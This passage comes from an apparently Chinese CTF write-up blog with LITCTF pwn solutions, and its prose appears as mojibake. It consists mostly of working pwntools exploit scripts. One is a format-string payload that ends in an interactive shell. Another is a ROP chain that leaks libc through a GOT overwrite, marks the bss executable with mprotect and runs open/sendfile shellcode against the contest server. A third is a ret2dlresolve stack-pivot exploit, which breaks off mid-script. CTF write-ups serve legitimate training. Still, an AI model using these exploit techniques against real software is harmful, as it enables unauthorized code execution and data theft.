    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>s1<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hn"</span></span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> 
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>ä½†æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ¯æ¬¡é‡åˆ°è¿™ç§é¢˜ç›®ï¼Œæœ¬åœ°è°ƒè¯•æ¯æ¬¡æ”¹æ€»æ˜¯ä¸æˆåŠŸå§ã€‚åæ­£å¾ˆå¥‡æ€ªã€‚æˆ‘å½“æ—¶æ¯”èµ›çš„æ—¶å€™æ‰“é€šäº†ï¼Œç°åœ¨ä¸çŸ¥é“æ€ä¹ˆå¾—å°±æ˜¯æ²¡é€šï¼Œä¹Ÿæ˜¯å¾ˆæç¬‘äº†ã€‚å¦‚æœæœ‰å¸ˆå‚…çŸ¥é“ä¸ºä»€ä¹ˆå¯ä»¥è¯„è®ºå‘Šè¯‰æˆ‘ï¼Œè°¢è°¢å¸ˆå‚…ã€‚</p>
<h5 id="pwn-recurse"><a href="#pwn-recurse" class="headerlink" title="pwn&#x2F;recurse"></a>pwn&#x2F;recurse</h5><blockquote>
<p>I hate loops.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>
<span class="token preprocessor property">#include &lt;sys/wait.h></span>

<span class="token keyword">int</span> <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">int</span></span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token operator">==</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> end <span class="token operator">=</span> <span class="token function">strcspn</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> end<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Filename? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> fname<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> fn <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">fname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fn<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name"><span class="token keyword">char</span></span> c <span class="token operator">=</span> fname<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token char">'a'</span> <span class="token operator">&lt;=</span> c <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Only a-z and ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice try!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"a+b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Read (R) or Write (W)? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> option<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">get</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">option</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token char">'R'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents: "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> <span class="token char">'W'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name"><span class="token keyword">int</span></span> ret <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"gcc main.c -o main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Compilation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æƒ³æ³•å°±æ˜¯ä»€ä¹ˆå¯ä»¥åœ¨mainä¹‹å‰æ‰§è¡Œå‘¢ï¼Ÿ é‚£å°±æ˜¯å¤´æ–‡ä»¶ï¼Œé¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/yZQKgVEFd8CelfH.png" alt="b52180d2f45646108beb17ea1f4718fb.png"></p>
<h5 id="pwn-w4dup-2de"><a href="#pwn-w4dup-2de" class="headerlink" title="pwn&#x2F;w4dup 2de"></a>pwn&#x2F;w4dup 2de</h5><p>è¿™é¢˜æœ‰æ„æ€ï¼Œä¸€æ¬¡è¾“å…¥ã€‚æœ‰æ²™ç›’ï¼Œ</p>
<p><img src="https://s2.loli.net/2024/08/19/4lwS2z85HebP6nv.png" alt="126a482ea74a4469ad70aee7133b00fd.png"></p>
<p>å“ªä¸ªåé¢å…³äºfdçš„ï¼Œåˆ†æä¸€ä¸‹å¤§è‡´å°±æ˜¯readåªèƒ½æ ‡å‡†è¾“å…¥ï¼ˆfd&#x3D;0ï¼‰ã€‚ </p>
<p><img src="https://s2.loli.net/2024/08/19/s34CqYkgQNiLJFf.png" alt="cb896da815da4ac5a9f2fec9d5dade6d.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/srXM7IAEOqlTcWG.png" alt="2088bfe38f27419eb81aee0cdd8aff05.png"></p>
<p>çœ‹äº†çœ‹ä¿æŠ¤ï¼Œæ—¢ç„¶å¯ä»¥ä»»æ„å†™ï¼ˆå› ä¸ºrsiå¯„å­˜å™¨å¯ä»¥æ§åˆ¶ï¼‰ï¼Œé‚£å°±æ”¹gotè¡¨ä¸ºwriteè¾“å‡ºæ³„éœ²libcï¼Œä¹‹ååœ¨ç»™bssæ®µæƒé™æ¥æ‰§è¡Œshellcodeï¼ˆopenatï¼Œsendfileï¼‰ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>
rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>
rbp_ret <span class="token operator">=</span> <span class="token number">0x000000000040117d</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x000000000040132d</span>
bss <span class="token operator">=</span> <span class="token number">0x404800</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x28</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rbp_ret<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p16<span class="token punctuation">(</span><span class="token number">0x71d0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    read <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b"\x00\x00"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002601f</span>
    rdx_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000dfc12</span>
    pl2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span>bss<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rsi_ret<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>rdx_ret<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl2 <span class="token operator">+=</span> shellcode
    sl<span class="token punctuation">(</span>pl2<span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token comment"># io = process("./pwn")</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span><span class="token number">31771</span><span class="token punctuation">)</span>
        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p> æœ‰ä¸€ä½å­¦é•¿ç»™æˆ‘çš„ret2dlresolveï¼Œæ„Ÿè°¢å­¦é•¿ï¼Œtql !!! </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.31.so"</span><span class="token punctuation">)</span>
<span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>
lrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span> <span class="token number">31771</span><span class="token punctuation">)</span>

baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token comment"># + 8</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> frbp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x4013CA</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span> <span class="token operator">+</span> \
    p64<span class="token punctuation">(</span><span class="token number">0x4013B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>frbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>

<span class="token comment"># stack pvioting</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># dlresolve to leak</span>
rel <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rela.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynstr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"rela.plt : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rel<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynstr : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynsym : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynsym<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

fakeStrAddr <span class="token operator">=</span> baseStage <span class="token operator">+</span> <span class="token number">0xb0</span>
fakeStr <span class="token operator">=</span> <span class="token string">b"puts\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>

